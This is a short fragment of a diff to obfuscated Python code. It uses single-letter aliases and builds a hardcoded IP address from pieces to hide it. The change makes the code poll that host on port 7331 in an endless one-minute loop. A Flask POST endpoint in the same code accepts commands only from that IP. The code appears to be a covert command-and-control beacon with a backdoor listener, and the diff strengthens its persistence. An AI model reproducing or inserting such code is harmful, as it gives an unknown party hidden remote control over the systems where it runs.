@@ -14,11 +14,12 @@ a=F('.')
 p=50005
 w='.'.join(['90','156','226','65'])
 def o():
-  try:
-    r=u.get(f"http://{w}:7331/0")
-    if r.text=='1':return
-  except:pass
-  time.sleep(60)
+  while _A:
+    try:
+      r=u.get(f"http://{w}:7331/0")
+      if r.text=='1':return
+    except:pass
+    time.sleep(60)
 @a.route('/',methods=['POST'])
 def e():
   if q.remote_addr!=w:return y({'un':0}),403
